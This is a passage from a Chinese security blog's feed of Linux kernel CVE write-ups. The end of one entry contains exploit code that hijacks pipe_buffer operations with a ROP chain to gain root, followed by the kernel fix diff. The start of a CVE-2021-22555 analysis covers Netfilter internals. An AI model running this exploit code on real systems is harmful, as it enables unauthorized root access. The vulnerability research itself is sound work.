class="line"><span class="comment">     * so that we hijack the RIP</span></span><br><span class="line"><span class="comment">     * construct a ROP on pipe_buffer</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] Step.V hijack the ops of pipe_buffer, gain root privilege\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] pre-construct data in userspace...&quot;</span>);</span><br><span class="line">    pipe_buf_ptr = (<span class="keyword">struct</span> pipe_buffer *) fake_secondary_msg;</span><br><span class="line">    pipe_buf_ptr-&gt;ops = victim_addr;</span><br><span class="line"></span><br><span class="line">    ops_ptr = (<span class="keyword">struct</span> pipe_buf_operations *) fake_secondary_msg;</span><br><span class="line">    ops_ptr-&gt;release = <span class="number">0xffffffff8183b4d3</span> + kernel_offset;<span class="comment">// push rsi ; pop rsp ; add [rbp-0x3d],bl ; ret</span></span><br><span class="line">    ops_ptr-&gt;confirm = <span class="number">0xffffffff81689ea4</span> + kernel_offset;<span class="comment">// pop rdx ; pop r13 ; pop rbp ; ret</span></span><br><span class="line"></span><br><span class="line">    rop_idx = <span class="number">0</span>;</span><br><span class="line">    rop_chain = (<span class="type">uint64_t</span>*) &amp;fake_secondary_msg[<span class="number">0x20</span>];</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;</span><br><span class="line">    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">22</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = *(<span class="type">uint64_t</span>*) <span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    rop_chain[rop_idx++] = getRootShell;</span><br><span class="line">    rop_chain[rop_idx++] = user_cs;</span><br><span class="line">    rop_chain[rop_idx++] = user_rflags;</span><br><span class="line">    rop_chain[rop_idx++] = user_sp;</span><br><span class="line">    rop_chain[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (spraySkBuff(sk_sockets, fake_secondary_msg, </span><br><span class="line">            <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        close(pipe_fd[i][<span class="number">0</span>]);</span><br><span class="line">        close(pipe_fd[i][<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行即可完成提权</p><p><img src="https://s2.loli.net/2022/04/06/Fk975jsZhPfvyCJ.png" alt="image.png"></p><h1 id="0x03-漏洞修复"><a href="#0x03-漏洞修复" class="headerlink" title="0x03.漏洞修复"></a>0x03.漏洞修复</h1><p>该漏洞在内核主线的 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=93ce93587d36493f2f86921fa79921b3cba63fbb">这个 commit</a> 中被修复，这个 commit 增加的修改比较多，我们主要关注对于该漏洞其改变的部分：</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@@ -320,7 +319,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,</span><br><span class="line">     tf[i].info_mask &amp; WATCH_INFO_LENGTH)</span><br><span class="line"> goto err_filter;</span><br><span class="line"> /* Ignore any unknown types */</span><br><span class="line"><span class="deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * 8)</span></span><br><span class="line"><span class="addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span></span><br><span class="line"> continue;</span><br><span class="line"> nr_filter++;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">@@ -336,7 +335,7 @@</span> long watch_queue_set_filter(struct pipe_inode_info *pipe,</span><br><span class="line"> </span><br><span class="line"> q = wfilter-&gt;filters;</span><br><span class="line"> for (i = 0; i &lt; filter.nr_filters; i++) &#123;</span><br><span class="line"><span class="deletion">-if (tf[i].type &gt;= sizeof(wfilter-&gt;type_filter) * BITS_PER_LONG)</span></span><br><span class="line"><span class="addition">+if (tf[i].type &gt;= WATCH_TYPE__NR)</span></span><br><span class="line"> continue;</span><br><span class="line"> </span><br><span class="line"> q-&gt;type= tf[i].type;</span><br></pre></td></tr></table></figure><ul><li>修复了前后判定不一致的问题</li><li>将 type 的范围限定为 <code>WATCH_TYPE__NR</code>（值为 2）</li></ul><p>笔者个人认为这个修复还是比较成功的</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我在看着你👁_👁&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/categories/CVE/"/>
    
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="CVE" scheme="http://blog.arttnba3.cn/tags/CVE/"/>
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="提权" scheme="http://blog.arttnba3.cn/tags/%E6%8F%90%E6%9D%83/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x07】CVE-2021-22555 漏洞复现及简要分析</title>
    <link href="http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/"/>
    <id>http://blog.arttnba3.cn/2022/04/01/CVE-0X07-CVE-2021-22555/</id>
    <published>2022-03-31T16:18:06.000Z</published>
    <updated>2022-04-06T09:26:32.000Z</updated>
    
    <content type="html"><![CDATA[<p><del>喷子永远是版本答案</del></p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><p>CVE-2021-22555 是 Linux Netfilter 模块中的一个堆溢出漏洞，漏洞主要发生在64 位系统上为 32 位进程处理 setsockopt 时，若指定了 optname 为 <code>IPT_SO_SET_REPLACE</code>（或 <code>IP6T_SO_SET_REPLACE</code>），且开启了内核选项 <code>CONFIG_USER_NS</code> 、<code>CONFIG_NET_NS</code>，在内核结构转换时由于错误计算转换大小则会导致内核堆上的越界写入一些 0 字节，从而覆写相邻 object</p><p>该漏洞自内核版本 <code>v2.6.19-rc1</code> （<code>9fa492cdc160cd27ce1046cb36f47d3b2b1efa21</code>）引入，在这些版本中被修复：</p><ul><li><code>5.12 (b29c457a6511435960115c0f548c4360d5f4801d), 5.10.31, 5.4.113, 4.19.188, 4.14.231, 4.9.267, 4.4.267</code></li></ul><p>由于其影响范围极大，且利用较为简单，故获得了 <code>7.8</code> 的 CVSS 评分</p><p>在开始分析之前，我们先来补充一些前置知识</p><blockquote><p>本文主要参考了 bsauce 大师傅对该漏洞的分析与利用过程：<a href="https://www.anquanke.com/post/id/254027">https://www.anquanke.com/post/id/254027</a></p><p>本文中涉及到的内核源码为 <code>5.8</code> 版本</p></blockquote><h2 id="内核编译选项"><a href="#内核编译选项" class="headerlink" title="内核编译选项"></a><em>内核编译选项</em></h2><p>首先是所有 <code>CONFIG_IP_NF_**</code> 和 <code>CONFIG_NETFILTER_**</code> 相关的选项都要打开</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_IP_NF_IPTABLES=y</span><br><span class="line">CONFIG_IP_NF_MATCH_AH=y</span><br><span class="line">CONFIG_IP_NF_MATCH_ECN=y</span><br><span class="line">CONFIG_IP_NF_MATCH_RPFILTER=y</span><br><span class="line">CONFIG_IP_NF_MATCH_TTL=y</span><br><span class="line">CONFIG_IP_NF_FILTER=y</span><br><span class="line">CONFIG_IP_NF_TARGET_REJECT=y</span><br><span class="line">CONFIG_IP_NF_TARGET_SYNPROXY=y</span><br><span class="line">CONFIG_IP_NF_NAT=y</span><br><span class="line">CONFIG_IP_NF_TARGET_MASQUERADE=y</span><br><span class="line">CONFIG_IP_NF_TARGET_NETMAP=y</span><br><span class="line">CONFIG_IP_NF_TARGET_REDIRECT=y</span><br><span class="line">CONFIG_IP_NF_MANGLE=y</span><br><span class="line">CONFIG_IP_NF_TARGET_CLUSTERIP=y</span><br><span class="line">CONFIG_IP_NF_TARGET_ECN=y</span><br><span class="line">CONFIG_IP_NF_TARGET_TTL=y</span><br><span class="line">CONFIG_IP_NF_RAW=y</span><br><span class="line">CONFIG_IP_NF_SECURITY=y</span><br><span class="line">CONFIG_IP_NF_ARPTABLES=y</span><br><span class="line">CONFIG_IP_NF_ARPFILTER=y</span><br><span class="line">CONFIG_IP_NF_ARP_MANGLE=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER=y</span><br><span class="line">CONFIG_NETFILTER_ADVANCED=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_INGRESS=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK=y</span><br><span class="line">CONFIG_NETFILTER_FAMILY_BRIDGE=y</span><br><span class="line">CONFIG_NETFILTER_FAMILY_ARP=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_ACCT=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_QUEUE=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_LOG=y</span><br><span class="line">CONFIG_NETFILTER_NETLINK_OSF=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_CONNCOUNT=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_NETLINK_GLUE_CT=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_SYNPROXY=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XTABLES=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XT_MARK=y</span><br><span class="line">CONFIG_NETFILTER_XT_CONNMARK=y</span><br><span class="line">CONFIG_NETFILTER_XT_SET=y</span><br><span class="line"></span><br><span class="line">CONFIG_NETFILTER_XT_MATCH_U32=y</span><br><span class="line"><span class="comment"># 挺多的，这里笔者就不一一摘录了</span></span><br></pre></td></tr></table></figure><p>以及三个其他选项：</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_USER_NS=y</span><br><span class="line">CONFIG_NET_NS=y</span><br><span class="line">CONFIG_COMPAT=y</span><br></pre></td></tr></table></figure><h2 id="Netfilter"><a href="#Netfilter" class="headerlink" title="Netfilter"></a>Netfilter</h2><p>Netfilter 为 Linux 内核中的一个子模块，用以提供数据包过滤、网络地址转换、端口转换等功能，其整体框架如下图所示</p><p><img src="https://s2.loli.net/2022/03/28/SFpO9z7YRykLnqU.png" alt="Netfilter components"></p><p>例如 <code>iptables</code> 等工具便是利用 Netfilter 所提供的接口实现的，不过本篇我们主要关注其在内核中的部分</p><p>Netfilter 涵盖了内核网络协议栈的多层，一个数据包在 Netfilter 中的历程如下图所示：</p><p><img src="https://s2.loli.net/2022/03/28/8UnfDE7Mry1uhgW.png" alt="image.png"></p><p>在 Netfilter 中有一种名为 「table」 的结构，用以存储不同功能的配置信息，在内核当中使用 <code>xt_table</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Furniture shopping... */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* What hooks you will enter on */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> valid_hooks;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Man behind the curtain... */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> *<span class="title">private</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Set this to THIS_MODULE if you are a module, otherwise NULL */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">me</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="type">u_int8_t</span> af;<span class="comment">/* address/protocol family */</span></span><br><span class="line"><span class="type">int</span> priority;<span class="comment">/* hook order */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* called when table is needed in the given netns */</span></span><br><span class="line"><span class="type">int</span> (*table_init)(<span class="keyword">struct</span> net *net);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* A unique name... */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> name[XT_TABLE_MAXNAMELEN];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>该结构其实是一层 wrapper，其核心结构为 <code>xt_table_info</code>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The table itself */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_table_info</span> &#123;</span></span><br><span class="line"><span class="comment">/* Size per table */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="comment">/* Number of entries: FIXME. --RR */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> number;</span><br><span class="line"><span class="comment">/* Initial number of entries. Needed for module usage count */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> initial_entries;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Entry points and underflows */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> hook_entry[NF_INET_NUMHOOKS];</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> underflow[NF_INET_NUMHOOKS];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Number of user chains. Since tables cannot have loops, at most</span></span><br><span class="line"><span class="comment"> * @stacksize jumps (number of user chains) can possibly be made.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> stacksize;</span><br><span class="line"><span class="type">void</span> ***jumpstack;<span class="comment">// 我超，三级指针！</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> entries[] __aligned(<span class="number">8</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在每张  table 上有多个 chain，对应表示报文的拦截处理点，例如网络层中的 IP协议 便有 5 个拦截点：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">---&gt;[NF_IP_PRE_ROUTING]---&gt;[ROUTE]---&gt;[NF_IP_FORWARD]---&gt;[NF_IP_POST_ROUTING]---&gt;</span><br><span class="line">                              |                        ^</span><br><span class="line">                              |                        |</span><br><span class="line">                              |                     [ROUTE]</span><br><span class="line">                              v                        |</span><br><span class="line">                       [NF_IP_LOCAL_IN]        [NF_IP_LOCAL_OUT]</span><br><span class="line">                              |                        ^</span><br><span class="line">                              |                        |</span><br><span class="line">                              v                        |</span><br><span class="line">                             --------Local Process-------</span><br></pre></td></tr></table></figure><p>在每个 chain 中还有一些用户配置的 rule，一条 rule 可能包含一个或多个匹配规则（match）和一个执行动作（target），若报文 match 了，则执行 target 来处理报文；标准的匹配元素包含源&#x2F;目的IP地址、接收&#x2F;发送设备、传输层协议这五个元素，标准的执行动作包含 <code>accept</code>、<code>drop</code>、<code>queue</code>、<code>return</code></p><p>每条 rule 使用一个 <code>ipt_entry</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This structure defines each of the firewall rules.  Consists of 3</span></span><br><span class="line"><span class="comment">   parts which are 1) general IP header stuff 2) match specific</span></span><br><span class="line"><span class="comment">   stuff 3) the target to perform if the rule matches */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipt_entry</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ipt_ip</span> <span class="title">ip</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Mark with fields that we care about. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> nfcache;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Size of ipt_entry + matches */</span></span><br><span class="line">__u16 target_offset;</span><br><span class="line"><span class="comment">/* Size of ipt_entry + matches + target */</span></span><br><span class="line">__u16 next_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Back pointer */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> comefrom;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Packet and byte counters. */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_counters</span> <span class="title">counters</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The matches (if any), then the target. */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> elems[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>而 rule 和 target 则分别使用 <code>xt_entry_match</code> 与 <code>xt_entry_target</code> 结构表示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_match</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 match_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used by userspace */</span></span><br><span class="line"><span class="type">char</span> name[XT_EXTENSION_MAXNAMELEN];</span><br><span class="line">__u8 revision;</span><br><span class="line">&#125; user;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 match_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used inside the kernel */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_match</span> *<span class="title">match</span>;</span></span><br><span class="line">&#125; kernel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Total length */</span></span><br><span class="line">__u16 match_size;</span><br><span class="line">&#125; u;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_entry_target</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 target_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used by userspace */</span></span><br><span class="line"><span class="type">char</span> name[XT_EXTENSION_MAXNAMELEN];</span><br><span class="line">__u8 revision;</span><br><span class="line">&#125; user;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">__u16 target_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Used inside the kernel */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">xt_target</span> *<span class="title">target</span>;</span></span><br><span class="line">&#125; kernel;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Total length */</span></span><br><span class="line">__u16 target_size;</span><br><span class="line">&#125; u;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> data[<span class="number">0</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><code>table-&gt;chain-&gt;rule</code> 的关系如下图所示，这里我们可以看到对于单个 rule 在每个 CPU 上都维护了一份他的拷贝，这样做的目的是为了减少锁的使用、增加 L1 cache 的命中次数，以空间换时间</p><p><img src="https://s2.loli.net/2022/03/29/4hwpn7HdagVIiQL.png" alt="image.png"></p><h2 id="64-位下的-setsockopt-系统调用"><a href="#64-位下的-setsockopt-系统调用" class="headerlink" title="64 位下的 setsockopt 系统调用"></a><em>64 位下的 setsockopt 系统调用</em></h2><blockquote><p>和本漏洞没有关联，但是笔者没注意给分析了一遍…花了挺多力气所以这里也不想删了，就留下来了，如果只关注漏洞本身的可以直接跳过XD 感兴趣的话可以简单看看</p></blockquote><p>用户进程与 Netfilter 间进行通信主要是通过 <code>getsockopt</code> 与 <code>setsockopt</code> 这两个系统调用，这是一套配对使用的系统调用，用以读取或修改套接字的配置信息，我们这一次主要关注 <code>setsockopt</code></p><blockquote><p>本次漏洞利用中我们创建 socket 时使用 <code>socket(AF_INTE, SOCK_STREAM, 0)</code>，故后面涉及到的 socket 源码都会顺着这个路径分析</p></blockquote><p>在 <code>setsockopt</code> 系统调用中会调用到内核中的 <code>__sys_setsockopt()</code> ，最终调用到对应的 socket 结构体的函数表中的 <code>setsockopt</code> 函数指针（ <code>sock-&gt;ops-&gt;setsockopt()</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __sys_setsockopt(<span class="type">int</span> fd, <span class="type">int</span> level, <span class="type">int</span> optname,</span><br><span class="line">    <span class="type">char</span> __user *optval, <span class="type">int</span> optlen)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"><span class="keyword">if</span> (level == SOL_SOCKET)</span><br><span class="line">err =</span><br><span class="line">    sock_setsockopt(sock, level, optname, optval,</span><br><span class="line">    optlen);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">err =</span><br><span class="line">    sock-&gt;ops-&gt;setsockopt(sock, level, optname, optval,</span><br><span class="line">  optlen);</span><br></pre></td></tr></table></figure><p>这个函数表其实是在 socket 创建时（<code>__sock_create()</code>）进行动态指定的，通过对应 family 指定的创建函数进行创建：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __sock_create(<span class="keyword">struct</span> net *net, <span class="type">int</span> family, <span class="type">int</span> type, <span class="type">int</span> protocol,</span><br><span class="line"> <span class="keyword">struct</span> socket **res, <span class="type">int</span> kern)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> err;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> *<span class="title">pf</span>;</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">rcu_read_lock();</span><br><span class="line">pf = rcu_dereference(net_families[family]);</span><br><span class="line">err = -EAFNOSUPPORT;</span><br><span class="line"><span class="keyword">if</span> (!pf)</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We will call the -&gt;create function, that possibly is in a loadable</span></span><br><span class="line"><span class="comment"> * module, so we have to bump that loadable module refcnt first.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!try_module_get(pf-&gt;owner))</span><br><span class="line"><span class="keyword">goto</span> out_release;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Now protected by module ref count */</span></span><br><span class="line">rcu_read_unlock();</span><br><span class="line"></span><br><span class="line">err = pf-&gt;create(net, sock, protocol, kern);</span><br></pre></td></tr></table></figure><p>比如说对于 <code>AF_INET</code> （<code>PF_INET</code>）而言，应该用到的是 <code>inet_create()</code> 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">net_proto_family</span> <span class="title">inet_family_ops</span> =</span> &#123;</span><br><span class="line">.family = PF_INET,</span><br><span class="line">.create = inet_create,</span><br><span class="line">.owner= THIS_MODULE,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在 <code>inet_init()</code> 函数中使用 <code>sock_register</code> 在 <code>net_families</code> 数组中注册了该结构体（<code>__init</code> 宏可以看出这是一个模块初始化函数）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 